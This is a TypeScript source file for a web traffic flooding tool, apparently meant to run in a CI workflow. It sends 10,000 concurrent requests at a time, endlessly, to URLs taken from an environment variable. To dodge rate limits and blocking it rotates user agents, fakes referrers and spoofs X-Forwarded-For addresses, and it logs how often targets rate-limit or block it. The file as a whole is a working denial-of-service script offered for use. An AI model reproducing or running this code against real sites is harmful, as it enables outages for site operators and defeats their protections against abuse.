// Load URLs from environment variable (comma-separated)
const URLS = (process.env.TARGET_URLS || '').split(',');
const REQUESTS = 10000;
const CONCURRENCY = 10000;

// List of common user agents
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
];

// List of common referrers
const REFERRERS = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.facebook.com/',
    'https://t.co/',
    'https://www.reddit.com/',
    'https://www.youtube.com/',
];

// Generate random IP-like string
const generateIP = () =>
    `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

// Get random item from array
const getRandomItem = (arr: string[]) => arr[Math.floor(Math.random() * arr.length)];

import chalk from 'chalk';

// Add new types for tracking request status
type RequestStatus = {
    success: number;
    failed: number;
    rateLimit: number;
    blocked: number;
    networkError: number;
    timeouts: number;
};

async function makeRequest(): Promise<keyof RequestStatus> {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 3000);

        // Random target URL
        const targetUrl = getRandomItem(URLS);

        // Generate random headers
        const headers = {
            'User-Agent': getRandomItem(USER_AGENTS),
            Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            Referer: getRandomItem(REFERRERS),
            'X-Forwarded-For': generateIP(),
            'Cache-Control': 'no-cache',
            Pragma: 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            DNT: '1',
            'Upgrade-Insecure-Requests': '1',
            Connection: 'keep-alive',
        };

        // Add random delay before the request
        await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 1000)));

        const response = await fetch(targetUrl, {
            signal: controller.signal,
            headers,
            method: Math.random() > 0.9 ? 'POST' : 'GET',
        });

        clearTimeout(timeoutId);

        // Categorize different response types
        if (response.ok) return 'success';
        if (response.status === 429) return 'rateLimit';
        if (response.status === 403) return 'blocked';
        return 'failed';
    } catch (error) {
        if (error instanceof Error) {
            if (error.name === 'AbortError') return 'timeouts';
            if (error.message.includes('network')) return 'networkError';
        }
        return 'failed';
    }
}

async function sendRequests(): Promise<void> {
    const stats: RequestStatus = {
        success: 0,
        failed: 0,
        rateLimit: 0,
        blocked: 0,
        networkError: 0,
        timeouts: 0
    };

    const startTime = Date.now();
    let lastLogTime = startTime;

    console.log('::group::Starting new batch of requests...');

    const requests = Array(REQUESTS)
        .fill(null)
        .map(() => makeRequest().then(status => {
            stats[status]++;

            // Update logs every minute
            const now = Date.now();
            if (now - lastLogTime >= 60000) {
                lastLogTime = now;
                const totalRequests = Object.values(stats).reduce((a, b) => a + b, 0);
                const elapsedMinutes = ((now - startTime) / 60000).toFixed(1);

                console.log(`
[Status Report] Time Elapsed: ${elapsedMinutes} minutes
Progress: ${((totalRequests / REQUESTS) * 100).toFixed(1)}%
----------------------------------------
Successful: ${stats.success.toLocaleString()} (${((stats.success / totalRequests) * 100).toFixed(1)}%)
Failed: ${stats.failed.toLocaleString()} (${((stats.failed / totalRequests) * 100).toFixed(1)}%)
Rate Limited: ${stats.rateLimit.toLocaleString()} (${((stats.rateLimit / totalRequests) * 100).toFixed(1)}%)
Blocked: ${stats.blocked.toLocaleString()} (${((stats.blocked / totalRequests) * 100).toFixed(1)}%)
Network Errors: ${stats.networkError.toLocaleString()} (${((stats.networkError / totalRequests) * 100).toFixed(1)}%)
Timeouts: ${stats.timeouts.toLocaleString()} (${((stats.timeouts / totalRequests) * 100).toFixed(1)}%)
----------------------------------------
Target URLs: ${URLS.length}
Requests/Minute: ${(totalRequests / parseFloat(elapsedMinutes)).toFixed(0)}
`);
            }
        }));

    // Process requests in chunks
    for (let i = 0; i < requests.length; i += CONCURRENCY) {
        const chunk = requests.slice(i, i + CONCURRENCY);
        await Promise.all(chunk);
    }

    // Final summary
    const totalTime = ((Date.now() - startTime) / 60000).toFixed(1);
    const totalRequests = Object.values(stats).reduce((a, b) => a + b, 0);

    console.log('::endgroup::');
    console.log(`
[Final Results]
----------------------------------------
Total Time: ${totalTime} minutes
Total Requests: ${totalRequests.toLocaleString()}
----------------------------------------
Successful: ${stats.success.toLocaleString()} (${((stats.success / totalRequests) * 100).toFixed(1)}%)
Failed: ${stats.failed.toLocaleString()} (${((stats.failed / totalRequests) * 100).toFixed(1)}%)
Rate Limited: ${stats.rateLimit.toLocaleString()} (${((stats.rateLimit / totalRequests) * 100).toFixed(1)}%)
Blocked: ${stats.blocked.toLocaleString()} (${((stats.blocked / totalRequests) * 100).toFixed(1)}%)
Network Errors: ${stats.networkError.toLocaleString()} (${((stats.networkError / totalRequests) * 100).toFixed(1)}%)
Timeouts: ${stats.timeouts.toLocaleString()} (${((stats.timeouts / totalRequests) * 100).toFixed(1)}%)
----------------------------------------
Target URLs: ${URLS.length}
Average Requests/Minute: ${(totalRequests / parseFloat(totalTime)).toFixed(0)}
`);
}

// Infinite loop
async function main() {
    // Check if TARGET_URLS is provided and not empty after splitting
    const urls = (process.env.TARGET_URLS || '').split(',').filter(url => url.trim());
    if (urls.length === 0) {
        console.log('No valid target URLs provided. Please set TARGET_URLS environment variable.');
        process.exit(0);
    }

    // Update URLS constant with filtered values
    URLS.splice(0, URLS.length, ...urls);

    while (true) {
        await sendRequests();
        await new Promise((resolve) => setTimeout(resolve, 1000));
    }
}

main().catch(console.error);
